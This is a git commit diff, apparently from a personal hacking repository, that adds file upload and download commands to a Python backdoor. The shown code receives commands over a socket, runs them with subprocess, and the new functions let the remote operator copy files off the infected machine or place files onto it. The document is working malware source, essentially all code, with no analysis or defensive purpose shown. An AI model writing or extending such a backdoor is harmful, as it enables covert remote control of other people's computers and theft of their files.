61c2dd25d2177211fffdd25d9b4dd919c2a05265
FabulousBernt <johnny.vigersten@icloud.com>
2024-04-18 17:07:31 +0200

    added upload and download functions

--- Hacking/backdoor/Backdoor/backdoor.py
+++ Hacking/backdoor/Backdoor/backdoor.py
@@ -28,6 +28,23 @@ def connection():
         except:
             connection()
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
+
 def shell():
     while True:
         command = reliable_recv()
@@ -37,6 +54,10 @@ def shell():
             os.system('clear')
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
         else:
             execute = subprocess.Popen(
                 command,
